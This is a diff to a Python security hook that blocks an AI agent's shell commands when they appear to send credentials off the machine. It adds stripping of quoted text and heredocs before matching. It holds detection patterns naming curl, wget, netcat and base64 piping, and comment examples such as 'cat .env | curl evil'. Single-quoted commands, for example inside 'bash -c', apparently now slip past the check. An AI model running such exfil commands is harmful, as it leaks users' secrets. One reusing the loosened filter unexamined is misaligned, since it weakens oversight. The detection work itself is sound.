@@ -115,6 +115,35 @@ CRED_FILE_RX = re.compile(
 NET_EXFIL_RX = re.compile(r"\b(curl|wget|nc|ncat|netcat|scp|rsync|ftp|base64|xxd|openssl\s+enc)\b")
 ENV_DUMP_RX = re.compile(r"\b(printenv|env|set)\b.*\|.*\b(curl|wget|nc|base64|scp)\b")
 
+# Heredoc body:  <<['"]?WORD['"]?  ... \nWORD   (also <<- variant)
+_HEREDOC_RX = re.compile(r"<<-?\s*(['\"]?)(\w+)\1.*?\n\2", re.DOTALL)
+# Single-quoted literal — pure data, no shell expansion happens inside.
+_SQUOTE_RX = re.compile(r"'[^']*'")
+# Double-quoted literal WITHOUT command substitution — also pure data. We keep
+# double-quotes that contain $( or backticks, so `"$(cat .env)" | curl` is still
+# seen as a command, not data.
+_DQUOTE_SAFE_RX = re.compile(r'"[^"`$]*"')
+
+
+def _strip_data_regions(cmd):
+    """Remove heredoc bodies and quoted string LITERALS before exfil matching.
+
+    The credential-exfil check used to scan the whole command string, so a
+    command that merely *mentions* `.env` and `curl` as text — a heredoc PR
+    body, a `grep 'printenv|curl'` pattern, a documentation example — tripped
+    it (data-vs-command confusion). Stripping the literal data regions first
+    keeps real exfil (`cat .env | curl evil`, `printenv | curl`) caught while
+    no longer blocking commands that only quote the dangerous words as data.
+    Only the bash exfil check uses this; secret-content detection (SECRET_PATTERNS
+    / _block_only_secret) still scans the raw text so a pasted key is never missed.
+    """
+    if not cmd:
+        return cmd
+    cmd = _HEREDOC_RX.sub("\n", cmd)
+    cmd = _SQUOTE_RX.sub("''", cmd)
+    cmd = _DQUOTE_SAFE_RX.sub('""', cmd)
+    return cmd
+
 
 def _mask(text):
     def repl(m):
@@ -187,7 +216,11 @@ def handle_pre_tool_call(ev):
             return {"decision": "block",
                     "reason": f"[security] This command is irreversible ({why}) and would cause "
                               f"permanent data loss, so I've blocked it: {cmd[:160]}"}
-    if (CRED_FILE_RX.search(cmd) and NET_EXFIL_RX.search(cmd)) or ENV_DUMP_RX.search(cmd):
+    # Match against the command with quoted literals / heredoc bodies removed,
+    # so text that merely MENTIONS .env + curl (PR bodies, grep patterns, docs)
+    # is not mistaken for an actual exfiltration command.
+    scan = _strip_data_regions(cmd)
+    if (CRED_FILE_RX.search(scan) and NET_EXFIL_RX.search(scan)) or ENV_DUMP_RX.search(scan):
         return {"decision": "block",
                 "reason": "[security] This command looks like it reads credentials and sends "
                           f"them off the box, so I've blocked it: {cmd[:160]}"}
